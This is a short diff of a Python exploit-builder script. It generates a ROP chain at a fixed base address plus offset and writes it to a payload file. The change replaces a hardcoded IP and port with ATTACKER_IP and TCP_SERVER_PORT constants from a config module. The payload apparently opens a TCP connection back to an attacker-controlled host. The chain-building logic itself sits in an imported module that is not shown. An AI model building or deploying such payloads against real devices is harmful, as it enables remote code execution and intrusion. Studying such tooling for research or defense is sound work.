@@ -1,7 +1,8 @@
 from tcp_ropchain import *
+from config import *
 import struct
 
-rop_chain = tcp_thread_ropchain(0x4D070000 + 0x14, [192,168,178,89], 12345)
+rop_chain = tcp_thread_ropchain(0x4D070000 + 0x14, ATTACKER_IP, TCP_SERVER_PORT)
 
 with open('payload.s', 'w') as f:
     for val in rop_chain:
